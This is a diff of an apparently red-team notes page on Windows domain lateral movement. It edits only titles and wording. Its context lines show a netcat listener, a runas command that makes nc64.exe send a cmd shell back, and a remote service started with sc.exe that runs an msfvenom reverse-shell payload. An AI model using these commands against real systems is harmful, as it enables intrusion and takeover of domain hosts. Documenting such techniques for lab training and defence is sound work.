@@ -82,7 +82,7 @@ $ nc -lvnp 8888
 ```
 {% endcode %}
 
-From the remote shell session (step 1), we can spawn a new `/netonly` shell to allow us to perform network connections/requests as the admin:
+From the remote shell session (step 1), we can spawn a new `/netonly` shell to allow us to perform network connections/requests as the domain admin:
 
 {% code title="jmp.test.com (user)" overflow="wrap" %}
 ```sh
@@ -92,7 +92,7 @@ C:\Users\user> runas.exe /netonly /user:test.com\admin "c:\tools\nc64.exe -e cmd
 
 The listener on port **8888** will receive a remote command prompt on `jmp.test.com` as the admin:
 
-{% code title="jmp.test.com (admin)" %}
+{% code title="test.com (Domain Admin)" %}
 ```
 C:\Windows\system32> whoami
 user
@@ -105,7 +105,7 @@ user
 
 Now, with a shell session as the admin, we can create a service executable that calls our uploaded `msfvenom` payload created earlier:
 
-{% code title="jmp.test.com (admin)" overflow="wrap" %}
+{% code title="test.com (Domain Admin)" overflow="wrap" %}
 ```powershell
 # start powershell
 C:\> powershell
@@ -117,7 +117,7 @@ PS> sc.exe \\iis.test.com start rvshell
 
 Now, when the _IIS_ server startups, we will retrieve a reverse shell connection from the `msfconsole` session established earlier:
 
-{% code title="iis.test.com (admin)" %}
+{% code title="iis.test.com (SYSTEM)" %}
 ```
 C:\Windows/system32> hostname
 iis
